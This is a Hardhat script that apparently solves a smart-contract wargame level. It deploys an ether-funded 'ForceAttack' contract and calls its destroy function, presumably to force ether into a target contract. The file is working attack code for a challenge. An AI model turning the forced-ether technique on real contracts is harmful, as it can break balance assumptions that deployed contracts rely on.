const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0x1F708C24a0D3A740cD47cC0444E9480899f3dA7D";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  // Deploy the Contract
  const ForceAttackContract = await ethers.getContractFactory(
    "ForceAttack",
    signer
  );
  const ForceAttack = await ForceAttackContract.deploy({
    value: ethers.utils.parseEther("1"),
  });
  await ForceAttack.deployed();
  console.log("PayableContract deployed to:", ForceAttack.address);

  // Call the destroy function (onlyOwner)
  const owner = await ForceAttack.owner();
  console.log("Owner of the contract:", owner);
  const tx = await ForceAttack.destroy();
  console.log("Destroy transaction hash:", tx.hash);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
